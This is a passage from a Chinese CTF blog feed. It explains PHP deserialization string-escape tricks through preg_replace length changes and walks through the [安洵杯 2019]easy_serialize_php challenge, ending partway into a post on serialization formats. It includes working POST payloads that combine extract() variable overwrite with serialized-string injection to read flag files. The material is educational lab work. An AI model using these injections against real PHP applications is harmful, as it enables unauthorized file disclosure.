        <content type="html"><![CDATA[<h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><p>字符串逃逸分为两种</p><p><strong>增多和减少</strong></p><p>主要是通过一个<strong>preg_replace</strong>函数来进行字符串的减少和增多。</p><p>首先要知道</p><h3 id="逃逸的原理"><a href="#逃逸的原理" class="headerlink" title="逃逸的原理"></a>逃逸的原理</h3><p>就是<strong>反序列化</strong>时，是以}来进行结尾的，同时在字符串内，是<strong>以关键字后面的数字来规定</strong>所读取的内容</p><h3 id="增多"><a href="#增多" class="headerlink" title="增多"></a>增多</h3><pre><code class="php">&lt;?phpclass A&#123;    public $a=&#39;q&#39;;    public $b=&#39;21&#39;;&#125;$a=new A;var_dump(serialize($a));</code></pre><p>结果为</p><pre><code class="php">string(45) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;q&quot;;s:1:&quot;b&quot;;s:2:&quot;21&quot;;&#125;&quot;</code></pre><p>要将反序列后$b的值变为我们想要的值。</p><p>我们还要有一个关键的函数</p><pre><code class="php">preg_replace</code></pre><p>eg：</p><pre><code class="php">function filter($a)&#123;    $filter=&#39;/q/i&#39;;    return preg_replace($filter,&#39;ww&#39;,$a);&#125;</code></pre><p>这个就是将序列化后的值，将所有的’q’变为’ww’</p><pre><code class="php">&lt;?phpclass A&#123;    public $a=&#39;qqqqqqq&#39;;    public $b=&#39;21&#39;;&#125;function filter($a)&#123;    $filter=&#39;/q/i&#39;;    return preg_replace($filter,&#39;ww&#39;,$a);&#125;$a=new A;var_dump(serialize($a));echo&#39;&lt;pre&gt;&#39;;$r=filter(serialize($a));var_dump($r);</code></pre><p>我们可以发现所有的q都变成了ww</p><pre><code class="php">string(51) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;qqqqqqq&quot;;s:1:&quot;b&quot;;s:2:&quot;21&quot;;&#125;&quot;&lt;pre&gt;string(58) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;wwwwwwwwwwwwww&quot;;s:1:&quot;b&quot;;s:2:&quot;21&quot;;&#125;&quot;</code></pre><blockquote><p>s:7:”qqqqqqq”</p><p>s:7:”wwwwwwwwwwwwww”</p></blockquote><p>比较上面两个</p><p>可以看到<strong>已替换</strong>字符串中的<strong>wwwwwwwwwwwwww</strong>与前面的字符长度不对应了</p><p>这里传入的q就是我们可以的可控对象</p><p>假设我们想要$b&#x3D;104，构造的$b的值的序列化后为:</p><pre><code class="php">&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;//&quot;;是用来闭合前面的，往下看就知道了</code></pre><p>那么问题来了</p><h4 id="如何进行逃逸"><a href="#如何进行逃逸" class="headerlink" title="如何进行逃逸"></a>如何进行逃逸</h4><p>我们先看看把上面的字符串加到$a后是什么样的。</p><p>如下</p><pre><code class="php">&lt;?phpclass A&#123;    public $a=&#39;qqqqqqq&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&#39;;    public $b=&#39;21&#39;;&#125;function filter($a)&#123;    $filter=&#39;/q/i&#39;;    return preg_replace($filter,&#39;ww&#39;,$a);&#125;$a=new A;var_dump(serialize($a));echo&#39;&lt;pre&gt;&#39;;$r=filter(serialize($a));var_dump($r);</code></pre><p>结果为</p><pre><code class="php">string(73) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:28:&quot;qqqqqqq&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:2:&quot;21&quot;;&#125;&quot;&lt;pre&gt;string(80) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:28:&quot;wwwwwwwwwwwwww&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:2:&quot;21&quot;;&#125;&quot;</code></pre><p>然后仔细看，如果我们把s:28后面的内容以字符串按要求填满了28个，那么s:1:”b”;s:3:”104”;}就会执行。而}”后面的内容，即;s:1:”b”;s:2:”21”;}”就不会执行了，从而达到了逃逸的目的（<strong>不明白的可以细嗦一下原理</strong>）</p><p>然后进行构造：</p><p>只要让’w’字符的数量按要求达到s:后面所要求的的数量即可。</p><p>又因为在filter函数中，一个q被换成了两个w，所以让q的数量等于**”;s:1:”b”;s:3:”104”;}**的字符串长度就行了</p><p>这里preg_replace函数为我们提供了逃逸的可能性</p><p>构造</p><pre><code class="php">&lt;?phpclass A&#123;    public $a=&#39;qqqqqqqqqqqqqqqqqqqqq&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&#39;;    public $b=&#39;21&#39;;&#125;function filter($a)&#123;    $filter=&#39;/q/i&#39;;    return preg_replace($filter,&#39;ww&#39;,$a);&#125;$a=new A;var_dump(serialize($a));echo&#39;&lt;pre&gt;&#39;;$r=filter(serialize($a));var_dump($r);</code></pre><p>结果</p><pre><code class="php">string(87) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:42:&quot;qqqqqqqqqqqqqqqqqqqqq&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:2:&quot;21&quot;;&#125;&quot;&lt;pre&gt;string(108) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:42:&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:2:&quot;21&quot;;&#125;&quot;</code></pre><p>再对其反序列化即可发现</p><p>$b的值变成了104。</p><pre><code class="php">&lt;?phpclass A&#123;    public $a=&#39;qqqqqqqqqqqqqqqqqqqqq&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&#39;;    public $b=&#39;21&#39;;&#125;function filter($a)&#123;    $filter=&#39;/q/i&#39;;    return preg_replace($filter,&#39;ww&#39;,$a);&#125;$a=new A;var_dump(serialize($a));echo&#39;&lt;pre&gt;&#39;;$r=filter(serialize($a));var_dump($r);var_dump(unserialize($r));</code></pre><p>结果</p><pre><code class="php">string(87) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:42:&quot;qqqqqqqqqqqqqqqqqqqqq&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:2:&quot;21&quot;;&#125;&quot;&lt;pre&gt;string(108) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:42:&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:2:&quot;21&quot;;&#125;&quot;object(A)#2 (2) &#123;  [&quot;a&quot;]=&gt;  string(42) &quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;  [&quot;b&quot;]=&gt;  string(3) &quot;104&quot;&#125;</code></pre><p> <strong>总的就是说，让字符’w’占用了原本属于”;s:1:”b”;s:3:”104”}的位置，从而让”;s:1:”b”;s:3:”104”}逃逸出去而成功执行。</strong></p><h3 id="减少"><a href="#减少" class="headerlink" title="减少"></a>减少</h3><pre><code class="php">&lt;?phpclass A&#123;    public $a=&#39;qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&#39;;    public $b=&#39;20&#39;;&#125;function filter($a)&#123;    $filter=&#39;/qq/i&#39;;    return preg_replace($filter,&#39;w&#39;,$a);&#125;$a=new A;var_dump(serialize($a));echo &#39;&lt;pre&gt;&#39;;$r=filter(serialize($a));var_dump($r);</code></pre><p>输出</p><pre><code class="php">string(79) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:34:&quot;qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&quot;;s:1:&quot;b&quot;;s:2:&quot;20&quot;;&#125;&quot;&lt;pre&gt;string(62) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:34:&quot;wwwwwwwwwwwwwwwww&quot;;s:1:&quot;b&quot;;s:2:&quot;20&quot;;&#125;&quot;</code></pre><p>顾名思义这个是让字符串变少</p><h4 id="那么要如何让字符串逃逸呢？"><a href="#那么要如何让字符串逃逸呢？" class="headerlink" title="那么要如何让字符串逃逸呢？"></a>那么要如何让字符串逃逸呢？</h4><p>同上面字符串增加：如果要让$b&#x3D;104,那么他的序列化后就是：s:1:”b”;s:3:”104”;</p><p>但是前面要加个东西，如：A”;s:1:”b”;s:3:”104”;，那个A是用来闭合的。</p><p>我们先把$b&#x3D;A”;s:1:”b”;s:3:”104”;}</p><pre><code class="php">&lt;?phpclass A&#123;    public $a=&#39;qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&#39;;    public $b=&#39;A&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&#39;;&#125;function filter($a)&#123;    $filter=&#39;/qq/i&#39;;    return preg_replace($filter,&#39;w&#39;,$a);&#125;$a=new A;var_dump(serialize($a));echo &#39;&lt;pre&gt;&#39;;$r=filter(serialize($a));var_dump($r);</code></pre><p>得到</p><pre><code class="php">string(100) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:34:&quot;qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&quot;;s:1:&quot;b&quot;;s:22:&quot;A&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&quot;;&#125;&quot;&lt;pre&gt;string(83) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:34:&quot;wwwwwwwwwwwwwwwww&quot;;s:1:&quot;b&quot;;s:22:&quot;A&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&quot;;&#125;&quot;</code></pre><p>这里可以看到，在序列化字符串里，有两个 s:1:”b”,第一个是序列化得到的，第二个是我们自己构造的。</p><p>那么要如果让我们构造的104生效呢？</p><p>就要让<code>s:1:&quot;a&quot;:s:34:&quot;</code>读取到<code>s:22:&quot;A</code>，这样<code>s:22:&quot;A</code>就会变成$a的值</p><p>即：$a&#x3D;“wwwwwwwwwwwwwwwww”;s:1:”b”;s:22:”A”了</p><p>后面的内容（**s:1:”b”;s:3:”104”;<strong>）就可以执行（若反序列化则为</strong>$b&#x3D;’104’**）</p><p>所以这个时候就要想<strong>如何使这些字符串在一个合理的数量了</strong></p><p>通过filter去控制字符串的数量，让他减少从而满足上面的条件</p><p>filter是把qq变成w,根据我们的需要（让s:1:”a”:s:32:”读取到s:22:”A）我们只要让replace后的字符串减少数量等于</p><pre><code class="php">&quot;;s:1:&quot;b&quot;;s:22:&quot;A</code></pre><p>的数量即可</p><blockquote><p>PHP反序列化的机制是，比如如果前面是规定了有10个字符，但是只读到了9个就到了双引号，这个时候PHP会把双引号当做第10个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p></blockquote><p>也就是17个qq,34个q</p><pre><code class="php">&lt;?phpclass A&#123;    public $a=&#39;qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&#39;;    public $b=&#39;A&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&#39;;&#125;function filter($a)&#123;    $filter=&#39;/qq/i&#39;;    return preg_replace($filter,&#39;w&#39;,$a);&#125;$a=new A;var_dump(serialize($a));echo &#39;&lt;pre&gt;&#39;;$r=filter(serialize($a));var_dump($r);print_r(unserialize($r));</code></pre><p>输出</p><pre><code class="php">string(100) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:34:&quot;qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&quot;;s:1:&quot;b&quot;;s:22:&quot;A&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&quot;;&#125;&quot;&lt;pre&gt;string(83) &quot;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:34:&quot;wwwwwwwwwwwwwwwww&quot;;s:1:&quot;b&quot;;s:22:&quot;A&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;&#125;&quot;;&#125;&quot;A Object(    [a] =&gt; wwwwwwwwwwwwwwwww&quot;;s:1:&quot;b&quot;;s:22:&quot;A    [b] =&gt; 104)</code></pre><h4 id="与字符串增加的区别"><a href="#与字符串增加的区别" class="headerlink" title="与字符串增加的区别"></a>与字符串增加的区别</h4><p>1.字符串增加：构造的序列化加在qqqq（就是值有很多qqqq的）那个变量里。字符串减少：构造的序列化加在另一个变量里。</p><p>2.字符串增加：字符串’qqqqxxx’的数量依照构造的那个序列化字符串的长度。字符串减少：*<em>字符串’qqqqxxx’的数量依照*</em>“O:1:”A”:2:{s:1:”a”;s:44:”wwwwwwwwwwwwwwwwwwwwww<code>&quot;;s:1:&quot;b&quot;;s:22:&quot;A</code>“;s:1:”b”;s:3:”104”;}”;}”中标记的字符的长度。</p><p><a href="https://www.cnblogs.com/v2ish1yan/articles/16113296.html">参考</a></p><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>来道练习题</p><pre><code class="php"> &lt;?php$function = @$_GET[&#39;f&#39;];function filter($img)&#123;    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;    unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function)&#123;    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;)&#123;    highlight_file(&#39;index.php&#39;);&#125;else if($function == &#39;phpinfo&#39;)&#123;    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!&#125;else if($function == &#39;show_image&#39;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125; </code></pre><pre><code class="php">function filter($img)&#123;    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);&#125;</code></pre><blockquote><p>filter接收一个参数<code>$img</code></p><p>用正则表达式从 <code>$img</code> 字符串中删除特定的字符串，并返回过滤后的字符串</p></blockquote><pre><code class="php">extract($_POST);</code></pre><p>这俩提供了逃逸的可能</p><h3 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a><strong>extract()变量覆盖</strong></h3><h4 id="看extract-函数的功能："><a href="#看extract-函数的功能：" class="headerlink" title="看extract()函数的功能："></a>看extract()函数的功能：</h4><p><strong>将键值 “Cat”、”Dog” 和 “Horse” 赋值给变量 $a、$b 和 $c：</strong></p><pre><code class="php">&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;?&gt;</code></pre><p>结果</p><pre><code class="php">$a = Cat; $b = Dog; $c = Horse </code></pre><p>extract($_POST)就是将post的内容作为这个函数的参数</p><p>然后就是变量覆盖</p><pre><code class="php">$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);</code></pre><p>如果post传参为<code>_SESSION[flag]=123</code>，那么<code>$_SESSION[&quot;user&quot;]</code>和<code>$_SESSION[&quot;function&quot;]</code>的值都会被覆盖。</p><p>至于为什么post<code>_SESSION[flag]=123</code>而不是<code>$_SESSION[flag]=123</code></p><p>是因为<code>_SESSION</code>是变量名，如果传<code>$_SESSION</code>，那么就会失效</p><p>本地演示一下</p><pre><code class="php">&lt;?php$_SESSION[&quot;user&quot;] = &#39;admin&#39;;$_SESSION[&#39;function&#39;] =&#39;root&#39;;echo &#39;覆盖前：&#39;;var_dump($_SESSION);echo &quot;&lt;br&gt;&quot;;extract($_POST);echo &#39;覆盖后：&#39;;var_dump($_SESSION);?&gt;</code></pre><p><img src="/img/strout1.png"></p><p>先</p><pre><code class="php">if($function == &#39;highlight_file&#39;)&#123;    highlight_file(&#39;index.php&#39;);&#125;else if($function == &#39;phpinfo&#39;)&#123;    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!</code></pre><p><code>?f=phpinfo</code>找找东西</p><p>发现一个<code>auto_append_file</code>:<code>d0g3_f1ag.php</code></p><p><code> auto_prepend_file</code> 表示在php程序加载应用程序前加载指定的php文件,也就是<code>require()预包含</code></p><p>要通过最后一个语句来打开查看这个文件</p><pre><code class="php">else if($function == &#39;show_image&#39;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125;</code></pre><p>如果要实现展示<code>d0g3_f1ag.php</code>文件</p><p>这个文件名以<code>base64</code>编码后的字符串存在<code>userinfo[&#39;img&#39;]</code>里面</p><p>而<code>$userinfo</code> &#x3D; <code>unserialize($serialize_info)</code></p><p>且<code>$serialize_info</code>&#x3D; <code>filter(serialize($_SESSION))</code></p><p>而且在提取文件时，只对文件进行了一次<code>base64</code>解码，所以对应代码里的</p><pre><code class="php">if(!$_GET[&#39;img_path&#39;])&#123;    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;</code></pre><p><code>img_path</code>应为空，并使<code>guest_img.png</code>逃逸出去</p><h3 id="开始逃逸"><a href="#开始逃逸" class="headerlink" title="开始逃逸"></a>开始逃逸</h3><p>先本地测试</p><p>反序列化和长这个样</p><pre><code class="php">&lt;?php$function = @$_GET[&#39;f&#39;];function filter($img)&#123;    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);&#125;$_SESSION[&quot;user&quot;] = &#39;*&#39;;$_SESSION[&#39;function&#39;] = &#39;**&#39;;$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);extract($_POST);if(!$_GET[&#39;img_path&#39;])&#123;    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info = filter(serialize($_SESSION));echo $serialize_info;echo &quot;____________&quot;;var_dump(unserialize($serialize_info)); //a:3:&#123;s:4:&quot;user&quot;;s:1:&quot;*&quot;;s:8:&quot;function&quot;;s:2:&quot;**&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></pre><p>我们要让<code>$_SESSION[&#39;img&#39;]</code>&#x3D; <code>base64_encode(&#39;d0g3_f1ag.php&#39;)</code></p><p>即<code>function</code>该是<code>;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p><p>应该POST传参这个<code>_SESSION[img]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p><p>但是得到确是<code>s:44:&quot;a:1:&#123;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;;</code></p><p>因为在变量覆盖后面，又重新给<code>$_SESSION[img]</code>赋值了 ,不能直接去读</p><p>这个时候就要使用filter()进行字符串减少的逃逸，让<code>guest_img.png</code>逃逸换成<code>d0g3_f1ag.php</code></p><p>如果我们传的是<code>_SESSION[imgphp]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p><p>那么得到<code>a:2:&#123;s:6:&quot;img&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;</code></p><p>这个时候就会发现出现了字符串逃逸<code>s:6:&quot;img&quot;;</code></p><p>如果让<code>s:6</code>吃掉<code>img&quot;;s:40:</code>那后面的<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code>就会成立</p><p>尝试构造一下，让<code>s:6</code>变成<code>s:10</code></p><p>即POST<code>_SESSION[imgphpflag]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p><p><code>a:2:&#123;s:10:&quot;img&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p><p>but反序列化时报错,原因是<code>a:2</code></p><p>即有两个元素，现在只有一个元素<code>img&quot;;s:40:</code>&#x3D;<code>img</code>，<code>ZDBnM19mMWFnLnBocA==</code>只有参数名</p><p>但是只要再加一个就可以让他满足条件</p><p>接着尝试构造</p><p>POST<code>_SESSION[imgphpflag]=;s:1:&quot;*&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p><p>这时输出</p><pre><code class="php">a:2:&#123;s:10:&quot;img&quot;;s:48:&quot;;s:1:&quot;*&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;____________array(2) &#123; [&quot;img&quot;;s:48:&quot;]=&gt; string(1) &quot;*&quot; [&quot;img&quot;]=&gt; string(20) &quot;ZDBnM19mMWFnLnBocA==&quot; &#125; </code></pre><p>可以看到</p><pre><code class="php">[&quot;img&quot;]=&gt; string(20) &quot;ZDBnM19mMWFnLnBocA==&quot; </code></pre><p>构造成功</p><p>本地尝试成功，拿到题目尝试</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote><p>GET:<code>f=show_image</code></p><p>POST:<code>_SESSION[imgphpflag]=;s:1:&quot;*&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p></blockquote><p>源码发现</p><pre><code class="php">?php$flag = &#39;flag in /d0g3_fllllllag&#39;;?&gt;</code></pre><p>直接访问无果</p><p>继续同样的方法读<code>/d0g3_fllllllag</code></p><p><code>bsae64</code>后同样为20位</p><p><code>L2QwZzNfZmxsbGxsbGFn</code></p><p>替换</p><blockquote><p>GET:<code>f=show_image</code></p><p>POST:<code>_SESSION[imgphpflag]=;s:1:&quot;*&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></p></blockquote><p>拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> WEB </category>
          
          <category> 反序列化 </category>
          
          <category> 字符串逃逸 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2023/07/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p><strong>梳理一下学过的(反)序列化的知识点</strong></p><p><strong>概念</strong>：序列化就是使用<strong>serialize()<strong>将对象的用字符串的方式进行表示，反序列化是使用</strong>unserialize()<strong>将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。 序列化的对象可以是</strong>class</strong>也可以是<strong>Array,string</strong>等其他对象</p><p><strong>问题原因</strong>：漏洞的根源在于<code>unserialize()</code>函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序列化漏洞</p><h2 id="两种参考"><a href="#两种参考" class="headerlink" title="两种参考"></a><strong>两种参考</strong></h2><h3 id="①"><a href="#①" class="headerlink" title="①"></a>①</h3><p>看个序列化例子</p><pre><code class="php">&lt;?phpclass Class1&#123;    public $a=&quot;data&quot;;    public $b=&quot;name&quot;;    private $c=&quot;num&quot;;    public function name()&#123;        return &quot;this is a test!&quot;;    &#125;&#125;$test= new Class1();$test1=serialize($test);echo $test1;//序列化的结果为:O:6:&quot;Class1&quot;:3:&#123;s:1:&quot;a&quot;;s:4:&quot;data&quot;;s:4:&quot;*b&quot;;s:4:&quot;name&quot;;s:9:&quot;Class1c&quot;;s:3:&quot;num&quot;;&#125;</code></pre><p>对象序列化后的结构为：</p><p><code>O:6:&quot;Class1&quot;:3:&#123;s:1:&quot;a&quot;;s:4:&quot;data&quot;;s:4:&quot;%00%00*b&quot;;s:4:&quot;name&quot;;s:9:&quot;%00Class1%00c&quot;;s:3:&quot;num&quot;;&#125;</code></p><pre><code>对象类型:对象名的长度:&quot;对象名&quot;:对象属性个数:&#123;s:属性名的长度:&quot;属性名&quot;;s:属性的长度:&quot;属性值&quot;;&#125;</code></pre><ul><li>a是public类型的变量，s表示字符串，1表示变量名的长度，a是变量名。</li><li>b是protected类型的变量，它的变量名长度为4，也就是b前添加了**%00%00<strong>。所以，protected属性的表示方式是在变量名前加上</strong>%00%00**。即：<code>%00%00*b</code></li><li>c是private类型的变量，c的<strong>变量名前</strong>添加了**%00类名%00<strong>。所以，private属性的表示方式是在变量名前加上</strong>%00类名%00**。即：<code>%00Class1%00c</code></li><li>虽然Test类中有name方法，但是，序列化得到的字符串中，只保存了<strong>公有变量a，保护变量b和私有变量c</strong>，并没保存类中的方法。也可以看出，序列化不保存方法。</li></ul><h3 id="②"><a href="#②" class="headerlink" title="②"></a>②</h3><p>demo</p><pre><code class="php">&lt;?phpclass Person&#123;    private $name=&quot;Thinking&quot;;    protected $sex=&quot;man&quot;;    public $age=[&quot;18&quot;];&#125;//class$test= new Person();$test1=serialize($test);echo $test1;//O:6:&quot;Person&quot;:3:&#123;s:12:&quot;Personname&quot;;s:8:&quot;Thinking&quot;;s:6:&quot;*sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;a:1:&#123;i:0;s:2:&quot;18&quot;;&#125;&#125;</code></pre><p><strong>对照看</strong></p><pre><code class="php">O:6:&quot;Person&quot;:3:&#123;s:12:&quot;%00Person%00name&quot;;s:8:&quot;Thinking&quot;;s:6:&quot;%00%00*sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;a:1:&#123;i:0;s:2:&quot;18&quot;;&#125;&#125;O:6:”Person”:2:&#123;s:12:” Person name”;s:8:”Thinking”;s:11:” Person  sex”;s:3:”man”;&#125;a:2:&#123;s:4:”name”;s:8:”Thinking”;s:3:”sex”;s:3:”man”;&#125;</code></pre><pre><code>对象类型:对象名长度:”对象名”:对象成员变量个数:&#123;变量1类型:变量名1长度:变量名1; 参数1类型:参数1长度:参数1; 变量2类型:变量名2长度:”变量名2”; 参数2类型:参数2长度:参数2;… …&#125;</code></pre><p><strong>对象类型：</strong>Class-O，Array-a。</p><p><strong>变量和参数类型：</strong>string-s，int-i，Array-a，引用-R。</p><p><strong>序列符号：</strong>参数与变量之间用分号(;)隔开，同一变量和同一参数之间的数据用冒号(:)隔开。</p><table><thead><tr><th align="center">类型</th><th align="center">结构</th></tr></thead><tbody><tr><td align="center">String</td><td align="center">s:size:value;</td></tr><tr><td align="center">Integer</td><td align="center">i:value;</td></tr><tr><td align="center">Boolean</td><td align="center">b:value;(保存1或0)</td></tr><tr><td align="center">Null</td><td align="center">N;</td></tr><tr><td align="center">Array</td><td align="center">a:size:{key definition;value definition;(repeated per element)}</td></tr><tr><td align="center">Object</td><td align="center">O:strlen(object name):object name:object size:{s:strlen(property name):property  name:property definition;(repeated per property)}</td></tr><tr><td align="center">Reference</td><td align="center">R:2;</td></tr></tbody></table><h3 id="三种访问控制的区别"><a href="#三种访问控制的区别" class="headerlink" title="三种访问控制的区别"></a>三种访问控制的区别</h3><p>public: <strong>变量名</strong></p><p>protected: <strong>\x00 + * + \x00 + 变量名</strong>（或 <strong>\00 + * + \00 + 变量名</strong> 或 <strong>%00 + * + %00 + 变量名</strong>）</p><p>private: <strong>\x00 + 类名 + \x00 + 变量名</strong>（或 <strong>\00 + 类名 + \00 + 变量名</strong> 或 <strong>%00 + 类名 + %00 + 变量名</strong>）</p><p>注：&gt;&#x3D;php v7.2 反序列化对访问类别不敏感（protected -&gt; public）</p><blockquote><p>反序列化对访问类别不敏感（protected -&gt; 